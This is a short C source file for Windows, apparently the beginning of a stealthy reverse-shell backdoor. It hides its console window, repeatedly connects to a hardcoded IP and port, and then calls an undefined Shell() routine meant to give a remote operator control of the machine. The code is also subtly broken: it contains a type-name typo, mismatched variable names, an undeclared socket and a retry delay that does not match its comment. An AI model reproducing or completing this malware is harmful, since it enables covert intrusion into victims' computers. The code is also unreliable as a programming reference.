#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int APIENTRY WinMain(HINSTANCE hInstance, HINSTACE hPrev, LPSTR lpCmdLine, int nCmdShow){

	// make it invisible
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);


	// creating the socket object
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIp = "192.168.1.44";
	ServPort = 50005;

	if (WSAStartup(MAKEWORD(2.0), &wsaData) != 0) {
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	// attempting connection every 10 seconds
	start:
	while (connect(sock, (struct sockaddr*) &ServAddr, sizeof(ServAddr)) != 0) {
		Sleep(10);
		goto start;
	}
	Shell();
}
